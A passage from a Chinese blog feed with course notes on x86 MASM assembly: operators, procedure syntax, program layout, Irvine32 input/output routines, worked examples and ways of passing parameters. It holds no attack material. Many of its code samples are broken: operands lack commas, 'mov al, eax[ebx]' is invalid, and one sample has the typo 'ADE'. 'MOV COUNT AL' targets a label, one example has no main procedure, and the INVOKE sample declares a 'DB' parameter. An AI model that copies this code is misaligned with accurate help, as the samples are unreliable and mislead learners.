是中缀运算符，用于表示<strong>常量移位</strong>临时的计算结果，结果相当于立即数。<code>[]</code>则是表示相加，<code>MOV AX，DA_WORD[20H]</code> 相当于 <code>MOV AX，DA_WORD+20H</code>，但是方括号外的加法是不允许的，比如 <code>ARRAY+EBX[ESI]</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">NUM=11011011B</span><br><span class="line">MOV   AX , NUM SHL  1</span><br><span class="line">MOV   BX ,  NUM SHR 2</span><br><span class="line">ADD   DX ,  NUM SHR 6</span><br></pre></td></tr></table></figure><p><code>NOT、AND、OR、XOR</code> 这些逻辑运算符，除了 <code>NOT</code> 是前缀，其他都是中缀，也是用于常量，返回立即数。</p><p><code>EQ（等于）、NE（不等于）、LT（小于）、 LE（小于等于）、GT（大于）、 GE（大于等于）</code> 这些关系运算符都是中缀，返回值要么全 1 表示真，要么全 0 表示假。</p><p>还有一些提取变量信息的运算符，也是相当于返回立即数。</p><ul><li><code>SEG</code> 是<strong>16 位</strong>下使用的返回变量段标号的，我们基本不会用到。</li><li><code>OFFSET</code> 则常用很多，提取变量的地址。<strong>OFFSET 无法获取寄存器值，所以 OFFSET ADDR[ESI]是错误的</strong>。</li><li><code>TYPE</code> 会返回变量的类型的长度。</li><li><code>LENGTH</code> 专门用于提取 <code>DUP</code> 的重复次数，是最外层的第一个 DUP。如果第一个元素不是 DUP，那么为 1.</li><li><code>LENGTHOF</code> 则是变量按照类型长度去数，有多少个元素。注意下面的变量，可以没有变量名。</li><li><code>SIZE</code>则是纯一层 DUP 定义数组的大小，LENGTH 和 TYPE 的乘积。实际编程我们不用它。</li><li><code>SIZEOF</code> 则有用很多，表示变量的大小，等于 LENGTHOF 和 TYPE 返回值的乘积</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">K1  DB   10H DUP(0), 20H</span><br><span class="line">K2  DB    10H，20H，30H，40H</span><br><span class="line">DB   50H, 60H</span><br><span class="line">K3  DW  20H DUP(0,1,2 DUP(0))</span><br><span class="line">K4  DB   ‘ABCDEFGH’</span><br></pre></td></tr></table></figure><table><thead><tr><th>变量</th><th>TYPE</th><th>LENGTH</th><th>LENGTHOF</th><th>SIZE</th><th>SIZEOF</th></tr></thead><tbody><tr><td>K1</td><td>1</td><td>10H</td><td>11H</td><td>10H</td><td>11H</td></tr><tr><td>K2</td><td>1</td><td>1</td><td>4</td><td>1</td><td>4</td></tr><tr><td>K3</td><td>2</td><td>20H</td><td>80H</td><td>40H</td><td>100H</td></tr><tr><td>K4</td><td>1</td><td>1</td><td>8</td><td>1</td><td>8H</td></tr></tbody></table><p>在赋值时，有时候还可以手动指定类型长度 <code>类型+PTR+变量名</code>，相当于在使用时类型转换了。但是很多时候汇编器会根据寄存器的长度，推理出赋值的长度。</p><p>为了拆分一个字的<strong>常数</strong>，<code>HIGH/LOW</code> 修饰符就可以获得一个字的高 8 位和低 8 位。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CONST  EQU   ABCDH</span><br><span class="line">MOV   AH ,HIGH  CONST</span><br><span class="line">MOV   AL, LOW  CONST</span><br></pre></td></tr></table></figure><h2 id="过程定义">过程定义</h2><p>主要学习定义子程序的语法，子过程的名字可以用 CALL 或者 INVOKE 调用，之后是可见属性三选一，一个模块类似于一个 C++类。寄存器列表，将会在编译过程增加指令，将这些寄存器自动压栈，ret 前自动出栈。比如<code>PROC USES EAX ECX</code>，先当于<code>PUSH EAX PUSH ECX   POP ECX POP EAX</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">子程序名字 PROC [PRIVATE/PUBLIC/EXPORT] [USES 使用的寄存器列表]</span><br><span class="line">LOCAL 局部变量定义</span><br><span class="line">指令</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">子过程名字 ENDP</span><br></pre></td></tr></table></figure><p><code>RET</code> 指令实际上从堆栈中弹出一个值，并将程序计数器（PC）设置为该值，从而将执行流程跳转到该地址。<code>RET n</code> 是 <code>RET</code> 指令的一个变体，其中 <code>n</code> 是一个立即数，表示在从子程序返回之后，还需要从堆栈中移除的字节数。这用于清除主程序调用子程序时，压入的参数。</p><h2 id="程序结构">程序结构</h2><ul><li><code>.386</code> 指定指令集。</li><li><code>.MODEL</code> 指定内存模式，比如 flat 模式，语言模式，比如 API 调用。</li><li><code>OPTION</code> 设定语句定义，必须大小写不敏感等等。</li><li><code>INCLUDE</code> 是头文件，<code>INCLUDELIB</code> 包含库文件。</li><li><code>ExitProcess PROTO, dwExitCode:DWORD</code> 部分程序在 <code>.DATA</code> 之前，需要声明用到的 API 函数，格式是 <code>函数名字 PROTO, 参数:类型</code>，但是也可以直接 <code>INCLUDE</code> 头文件，就不用手动声明了。</li><li><code>.CONST</code> 是常量，只读不可写。之后就是代码的部分，格式基本固定的。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.386</span><br><span class="line">.MODEL flat,stdcall</span><br><span class="line">OPTION casemap:none</span><br><span class="line">;  &lt;一些include语句&gt;</span><br><span class="line">INCLUDE user32.inc</span><br><span class="line">INCLUDE kernel32.inc</span><br><span class="line">INCLUDELIB user32.lib</span><br><span class="line">INCLUDELIB kernel32.lib</span><br><span class="line">.STACK [堆栈段的大小]</span><br><span class="line">.DATA</span><br><span class="line">;  &lt;一些初始化过的变量定义&gt;</span><br><span class="line">.DATA?</span><br><span class="line">;  &lt;一些没有初始化过的变量定义&gt;</span><br><span class="line">.CONST</span><br><span class="line">;  &lt;一些常量定义&gt;</span><br><span class="line">.CODE</span><br><span class="line">main PROC</span><br><span class="line">;     &lt;其他语句&gt;</span><br><span class="line">main  ENDP</span><br><span class="line">END main</span><br></pre></td></tr></table></figure><p>可以在代码中调用库函数，<code>invoke  函数名[，参数1][，参数2]……</code> 比如 <code>invoke ExitProcess,NULL</code>。</p><p><code>$</code> 表示位置计数器，实际上就是当前位置的地址，这就方便计算偏移量，比如某些变量的长度等。<code>ORG 数值表达式</code> 可以设置 $ 的值，这样可以在任意位置写入，也可以保留一部分未使用的内存。</p><h2 id="Windows-的输入输出">Windows 的输入输出</h2><p>课程使用的是封装好的 Win32 SDK，叫做 Irvine32.LIB，<strong>函数调用不带参数，而是寄存器传参数</strong>。</p><p>例如：编程实现从键盘输入 16 进制数，然后以二进制形式显示输出。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.386</span><br><span class="line">.model flat,stdcall</span><br><span class="line">.stack 4096</span><br><span class="line">ExitProcess PROTO,dwExitCode:DWORD</span><br><span class="line">INCLUDE Irvine32.inc</span><br><span class="line">INCLUDELIB Irvine32.lib</span><br><span class="line">.code</span><br><span class="line">main PROC</span><br><span class="line">call ReadHex     ;输入16进制数</span><br><span class="line">call WriteBin     ;输出二进制数</span><br><span class="line">INVOKE ExitProcess, 0</span><br><span class="line">main ENDP</span><br><span class="line">END  main</span><br></pre></td></tr></table></figure><p>简单了解一下一些函数：</p><ol><li><code>ReadChar</code> 从键盘读取一个字符， 它的 ASCII 码存在 AL，一些特殊键就为 0.</li><li><code>ReadDec</code> 从键盘读取 32 bit 无符号十进制整数，存在 EAX</li><li><code>ReadHex</code> 32bit 十六进制整数</li><li><code>ReadInt</code> 32 bit 有符号整数，第一个字符可以是 <code>+</code> <code>-</code></li><li><code>ReadKey</code> 检查键盘输入缓冲区，如果没有有按键数据则 ZF=1，有则 ZF=0，且存入 AL</li><li><code>ReadString</code> 从键盘读取一个字符串，直到用户键入回车键。EDX 是存储的变量的地址，ECX 是最大读取长度+1，读取的字符串末尾有 NULL。</li></ol><p>输出函数：</p><ul><li><code>WirteBin</code> EAX 的值二进制打印。</li><li><code>WirteBinB</code> EAX 的值，按照 EBX1,2,4 这样，显示 1，2，4 个字节。</li><li><code>WriteChar</code></li><li><code>WriteDec</code></li><li><code>WriteHex</code> 注意这个会补前置 0</li><li><code>WriteHexB</code></li><li><code>WriteInt</code></li><li><code>WriteString</code> 从 EDX 里面的地址开始，一直打印到表示结束的 0</li></ul><h1>程序设计基础</h1><p>例题 1：输入学号查学生的数学成绩，成绩按照学号顺序排列，每个字节一个成绩。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">.386</span><br><span class="line">.model flat, stdcall</span><br><span class="line">.stack 4096</span><br><span class="line">INCLUDE Irvine.inc</span><br><span class="line">INCLUDELIB Irvine32.lib</span><br><span class="line">ExitProcess PROTO, dwExitCode:DWORD</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">table DB 81, 78, 90, 64, 85, 76, 93, 82, 57, 80</span><br><span class="line">DB   73, 62, 87, 77, 74, 86, 95, 91, 82, 71</span><br><span class="line">math DB ?</span><br><span class="line"></span><br><span class="line">.code</span><br><span class="line">main PROC</span><br><span class="line">xor eax eax</span><br><span class="line">call ReadDec</span><br><span class="line">lea ebx table</span><br><span class="line">dec ebx</span><br><span class="line">and eax 0FH</span><br><span class="line">mov al, eax[ebx]</span><br><span class="line">mov math al</span><br><span class="line">call WriteDec</span><br><span class="line">invoke ExitProcess,0</span><br><span class="line">main ENDP</span><br><span class="line">END main</span><br></pre></td></tr></table></figure><p>例题 2：数据段的 ARY 数组中存放有 10 个无符号数，试找出其中最大者送入 MAX 单元。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">.386</span><br><span class="line">.model flat,stdcall</span><br><span class="line">.stack 4096</span><br><span class="line">ExitProcess PROTO, dwExitCode:DWORD</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">ARY    DB     17,5,40,0,67,12,34,78,32,10</span><br><span class="line">MAX    DB   ?</span><br><span class="line">.code</span><br><span class="line">main PROC</span><br><span class="line">    LEA ESI, ARY</span><br><span class="line">    MOV AL, [ESI]</span><br><span class="line">    MOV ECX, 9</span><br><span class="line">    INC ESI</span><br><span class="line"></span><br><span class="line">NEXT:</span><br><span class="line">CMP AL, [ESI]</span><br><span class="line">JL SETMAX</span><br><span class="line">CONTINUE:</span><br><span class="line">INC ESI</span><br><span class="line">DEC ECX</span><br><span class="line">JNZ NEXT</span><br><span class="line">JMP ASSIGN</span><br><span class="line">SETMAX:</span><br><span class="line">MOV AL, [ESI]</span><br><span class="line">JMP CONTINUE</span><br><span class="line">ASSIGN:</span><br><span class="line">MOV MAX, AL</span><br><span class="line"></span><br><span class="line">INVOKE ExitProcess,0</span><br><span class="line">main ENDP</span><br><span class="line">END main</span><br></pre></td></tr></table></figure><p>例题 3：设有两个数组 X 和 Y，它们都有 8 个元素，其元素按下标从小到大的顺序存放在数据段中。完成下列计算：Z1=X1+Y1 Z2=X2-Y2 Z3=X3+Y3 , Z4=X4-Y4 Z5=X5-Y5 Z6=X6+Y6, Z7=X7+Y7 Z8=X8-Y8</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">.386</span><br><span class="line">.MODEL flat,stdcall</span><br><span class="line">.STACK  4096</span><br><span class="line">ExitProcess PROTO,dwExitCode:DWORD</span><br><span class="line">.DATA</span><br><span class="line">X  DB 0A2H,7CH,34H,9FH,0F4H,10H,39H,5BH</span><br><span class="line">Y  DB 14H,05BH,28H,7AH,0EH,13H,46H,2CH</span><br><span class="line">Z DB 8 DUP(?)</span><br><span class="line">ADDSUB DB 10011010B;0表示+，1表示-</span><br><span class="line">.CODE</span><br><span class="line">MOV ECX 8</span><br><span class="line">MOV ESI 0</span><br><span class="line">MOV BL, ADDSUB</span><br><span class="line">LOP:</span><br><span class="line">MOV AL, [ESI+X]</span><br><span class="line">SHR BL,1;设置CF</span><br><span class="line">JC SUB1;CF=1</span><br><span class="line">;加法</span><br><span class="line">ADD AL,[ESI+Y]</span><br><span class="line">JMP CONTINUE</span><br><span class="line">SUB1:</span><br><span class="line">SUB AL [ESI+Y]</span><br><span class="line">CONTINUE:</span><br><span class="line">MOV[Z+ESI],AL</span><br><span class="line">INC ESI</span><br><span class="line">LOOP LOP;相当于ECX自减，然后不为0继续跳转LOP</span><br><span class="line"></span><br><span class="line">INVOKE ExitProcess,0</span><br><span class="line">main ENDP</span><br><span class="line">END main</span><br></pre></td></tr></table></figure><p>例题 4：编写一程序，将字单元 VARW 中含 1 的个数(含 1 的个数是指用二进制表示时,有多少个 1)统计出来，存入 CONT 单元中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">.386</span><br><span class="line">.MODEL flat,stdcall</span><br><span class="line">.STACK  4096</span><br><span class="line">ExitProcess PROTO,dwExitCode:DWORD</span><br><span class="line">.DATA</span><br><span class="line">VARW DW 1101010010001000B</span><br><span class="line">CONT DB ?</span><br><span class="line">.CODE</span><br><span class="line">main PROC</span><br><span class="line">MOV AX VARW</span><br><span class="line">MOV ECX 0</span><br><span class="line">LOP:</span><br><span class="line">SHR AX,1</span><br><span class="line">JC COUNT;CF=1</span><br><span class="line">CONTINUE:</span><br><span class="line">TEST AX, FFFFH;判断AX全0</span><br><span class="line">JNZ LOP</span><br><span class="line">JMP END0</span><br><span class="line"></span><br><span class="line">COUNT:</span><br><span class="line">INC ECX</span><br><span class="line">JMP CONTINUE</span><br><span class="line">END0:</span><br><span class="line">MOV COUNT AL</span><br><span class="line">INVOKE ExitProcess,0</span><br><span class="line">main ENDP</span><br><span class="line">END main</span><br></pre></td></tr></table></figure><h2 id="子程序">子程序</h2><p>在前面我们通过例子，学习了一般的顺序、分支、循环结构应该如何处理，这里学习如何使用子程序。最直接的方法就是寄存器传参，直接 call，子程序和写 <code>main</code> 是一样的，但是开始需要 PUSHAD，ret 前需要 POPAD。</p><p>比如下面的例子就是将 0-9 中的一位数，转换成二进制。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">.386</span><br><span class="line">.model flat, stdcall</span><br><span class="line">.stack 4096</span><br><span class="line">ExitProcess PROTO, dwExitCode:DWORD</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">buffer8 DB 0 ; 存储转换后的ASCII字符</span><br><span class="line">NUM1 DB 7</span><br><span class="line"></span><br><span class="line">.code</span><br><span class="line">bin8ToAscii PROC</span><br><span class="line">PUSHAD</span><br><span class="line">    ADD AL, &#x27;0&#x27; ; 转换为ASCII字符</span><br><span class="line">    MOV buffer8, AL ; 将ASCII字符存储在缓冲区中</span><br><span class="line">POPAD</span><br><span class="line">    RET</span><br><span class="line">bin8ToAscii ENDP</span><br><span class="line"></span><br><span class="line">main PROC</span><br><span class="line">    MOV AL, NUM1 ; 示例8位数 (范围0-9)</span><br><span class="line">    CALL bin8ToAscii ; 转换8位数</span><br><span class="line"></span><br><span class="line">    ; 在此处，buffer8包含转换后的ASCII字符</span><br><span class="line">    ; 可以在这里继续操作，例如打印输出等</span><br><span class="line"></span><br><span class="line">    INVOKE ExitProcess,0</span><br><span class="line">main ENDP</span><br><span class="line">END main</span><br></pre></td></tr></table></figure><p>还可以地址传参，就是把需要的变量的地址，全部放在全局变量里，然后把全局变量地址放在 EBX，子程序再从 EBX 获取。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">.386</span><br><span class="line">.model flat, stdcall</span><br><span class="line">.stack 4096</span><br><span class="line">ExitProcess PROTO, dwExitCode:DWORD</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">NUM1 DB 7</span><br><span class="line">buffer8 DB 0 ; 存储转换后的ASCII字符</span><br><span class="line">ADR DD 0</span><br><span class="line">.code</span><br><span class="line">bin8ToAscii PROC</span><br><span class="line">PUSHAD</span><br><span class="line">MOV EDI,[EBX] ;取全局变量值，也就是需要用到的变量的地址</span><br><span class="line">MOV AL,[EDI];取变量的值</span><br><span class="line">    ADD AL, &#x27;0&#x27; ; 转换为ASCII字符</span><br><span class="line">    MOV buffer8, AL ; 将ASCII字符存储在缓冲区中</span><br><span class="line">POPAD</span><br><span class="line">    RET 4</span><br><span class="line">bin8ToAscii ENDP</span><br><span class="line"></span><br><span class="line">main PROC</span><br><span class="line">    MOV ADR, OFFSET NUM1; 示例8位数 (范围0-9)</span><br><span class="line">    LEA EBX,ADE</span><br><span class="line">    CALL bin8ToAscii ; 转换8位数</span><br><span class="line"></span><br><span class="line">    ; 在此处，buffer8包含转换后的ASCII字符</span><br><span class="line">    ; 可以在这里继续操作，例如打印输出等</span><br><span class="line"></span><br><span class="line">    INVOKE ExitProcess,0</span><br><span class="line">main ENDP</span><br><span class="line">END main</span><br></pre></td></tr></table></figure><p>堆栈传参稍微复杂一些，在调用子程序之前，需要把对应的参数压栈，需要进入子程序之后，会自动加入偏移量，占一层堆栈。如果不带参数，可以这样写。<strong>注意参数压栈的顺序和自动插入的偏移量</strong>！有时候会为了恢复现场，在刚进入子程序就把寄存器压栈，ret 前再出栈，这样就重新覆盖了寄存器的值，可以保护现场，这时候也要注意堆栈变化，也要注意 PUSH POP 对应。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">.386</span><br><span class="line">.model flat, stdcall</span><br><span class="line">.stack 4096</span><br><span class="line">ExitProcess PROTO, dwExitCode:DWORD</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">NUM1 DB 7</span><br><span class="line">buffer8 DB 0 ; 存储转换后的ASCII字符</span><br><span class="line"></span><br><span class="line">.code</span><br><span class="line">bin8ToAscii PROC</span><br><span class="line">PUSH EAX</span><br><span class="line">MOV AL,[ESP+8]</span><br><span class="line">    ADD AL, &#x27;0&#x27; ; 转换为ASCII字符</span><br><span class="line">    MOV buffer8, AL ; 将ASCII字符存储在缓冲区中</span><br><span class="line">    POP EAX</span><br><span class="line">    RET 4</span><br><span class="line">bin8ToAscii ENDP</span><br><span class="line"></span><br><span class="line">main PROC</span><br><span class="line">MOVZX EAX,NUM1</span><br><span class="line">    PUSH EAX</span><br><span class="line">    CALL bin8ToAscii ; 转换8位数</span><br><span class="line"></span><br><span class="line">    ; 在此处，buffer8包含转换后的ASCII字符</span><br><span class="line">    ; 可以在这里继续操作，例如打印输出等</span><br><span class="line"></span><br><span class="line">    INVOKE ExitProcess,0</span><br><span class="line">main ENDP</span><br><span class="line">END main</span><br></pre></td></tr></table></figure><p>可以指定保护的寄存器，这样就不用手动恢复寄存器了，寄存器之间用空格隔开。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">.386</span><br><span class="line">.model flat, stdcall</span><br><span class="line">.stack 4096</span><br><span class="line">ExitProcess PROTO, dwExitCode:DWORD</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">NUM1 DB 7</span><br><span class="line">buffer8 DB 0 ; 存储转换后的ASCII字符</span><br><span class="line"></span><br><span class="line">.code</span><br><span class="line">bin8ToAscii PROC USES EAX</span><br><span class="line">MOV AL,[ESP+8]</span><br><span class="line">    ADD AL, &#x27;0&#x27; ; 转换为ASCII字符</span><br><span class="line">    MOV buffer8, AL ; 将ASCII字符存储在缓冲区中</span><br><span class="line">    RET 4</span><br><span class="line">bin8ToAscii ENDP</span><br><span class="line"></span><br><span class="line">main PROC</span><br><span class="line">MOVZX EAX,NUM1</span><br><span class="line">    PUSH EAX</span><br><span class="line">    CALL bin8ToAscii ; 转换8位数</span><br><span class="line"></span><br><span class="line">    ; 在此处，buffer8包含转换后的ASCII字符</span><br><span class="line">    ; 可以在这里继续操作，例如打印输出等</span><br><span class="line"></span><br><span class="line">    INVOKE ExitProcess,0</span><br><span class="line">main ENDP</span><br><span class="line">END main</span><br></pre></td></tr></table></figure><p>也可以使用 INVOKE 带参数调用，这样就不要在主程序里手动 PUSH 了，也不用手动管理堆栈，这是推荐的方式。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">.386</span><br><span class="line">.model flat, stdcall</span><br><span class="line">.stack 4096</span><br><span class="line">ExitProcess PROTO, dwExitCode:DWORD</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">NUM1 DB 7</span><br><span class="line">buffer8 DB 0 ; 存储转换后的ASCII字符</span><br><span class="line"></span><br><span class="line">.code</span><br><span class="line">bin8ToAscii PROC USES EAX,pa1:DB</span><br><span class="line">MOV AL, pa1</span><br><span class="line">    ADD AL, &#x27;0&#x27; ; 转换为ASCII字符</span><br><span class="line">    MOV buffer8, AL ; 将ASCII字符存储在缓冲区中</span><br><span class="line">    RET 4</span><br><span class="line">bin8ToAscii ENDP</span><br><span class="line"></span><br><span class="line">main PROC</span><br><span class="line">MOVZX EAX,NUM1</span><br><span class="line">    INVOKE bin8ToAscii AL; 转换8位数</span><br><span class="line"></span><br><span class="line">    ; 在此处，buffer8包含转换后的ASCII字符</span><br><span class="line">    ; 可以在这里继续操作，例如打印输出等</span><br><span class="line"></span><br><span class="line">    INVOKE ExitProcess,0</span><br><span class="line">main ENDP</span><br><span class="line">END main</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;blockquote&gt;
&lt;ol class=&quot;series-items&quot;&gt;&lt;li&gt;&lt;a href=&quot;/cs-courses/C-language-basis/&quot; title=&quot;C语言基础&quot;&gt;C语言基础&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/cs-courses/modular-inverses/&quot; title=&quot;乘法逆元&quot;&gt;乘法逆元&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/cs-courses/cpp-cryptographic-algorithm-basis/&quot; title=&quot;信息安全算法基础&quot;&gt;信息安全算法基础&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/cs-courses/OS/&quot; title=&quot;操作系统基础&quot;&gt;操作系统基础&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/cs-courses/x86-masm/&quot; title=&quot;x86汇编基础&quot;&gt;x86汇编基础&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/cs-courses/information-theory/&quot; title=&quot;信息论与编码&quot;&gt;信息论与编码&lt;/a&gt;&lt;/li&gt;&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;</summary>
        
      
    
    
    
    <category term="courses" scheme="https://www.blog-blockchain.xyz/categories/courses/"/>
    
    
    <category term="assembly" scheme="https://www.blog-blockchain.xyz/tags/assembly/"/>
    
  </entry>
  
  <entry>
    <title>操作系统基础</title>
    <link href="https://www.blog-blockchain.xyz/cs-courses/OS/"/>
    <id>https://www.blog-blockchain.xyz/cs-courses/OS/</id>
    <published>2023-02-13T15:06:22.000Z</published>
    <updated>2024-11-15T14:30:54.919Z</updated>
    
